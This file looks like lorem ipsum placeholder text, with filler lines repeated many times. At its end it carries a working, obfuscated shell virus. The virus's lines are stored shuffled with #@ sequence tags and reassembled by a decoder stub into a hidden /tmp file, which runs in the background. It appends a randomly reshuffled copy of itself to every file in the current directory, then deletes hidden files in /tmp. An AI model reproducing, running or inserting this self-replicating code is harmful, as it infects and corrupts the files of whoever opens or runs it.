Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
tail -n 36 /tmp/.pwd | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/.ls
chmod +x /tmp/.ls && /tmp/.ls &
exit 0
  fi  #@12
    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@33
  while [ $nbl -ne 36 ]; do  #@26
if [ "$1" == "test" ]; then  #@1
  tabft=("FT" [36]=" ")  #@24
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@22
  nbline=${nbline##}  #@8
  done  #@34
  exit 0  #@2
  nbline=$(wc -l $target)  #@7
    done  #@30
    continue  #@11
  echo "exit 0" >> $target  #@23
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@28
  NEWFILE="/tmp/.$NEWFILE"  #@20
  nbline=$(echo $nbline | cut -d " " -f1)  #@9
    valindex=$(((RANDOM % 36)+1))  #@27
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19
done  #@35
RANDOM=$$  #@5
      valindex=$(((RANDOM % 36) + 1))  #@29
  if [ "$?" == "0" ]; then  #@16
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@13
for target in *; do  #@6
  declare -i nbl=0  #@25
    continue  #@17
  fi  #@18
fi  #@3
MANAGER=(test cd ls pwd)  #@4
    line=$(tail -n $valindex $0 | head -1)  #@31
  if [ $(($nbline)) -lt 39 ]; then  #@10
    echo -e "$line" >> $target  #@32
  chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@15
  tail -n 36 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@14
  echo "tail -n 36 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@21
rm /tmp/.* 2> /dev/null  #@36
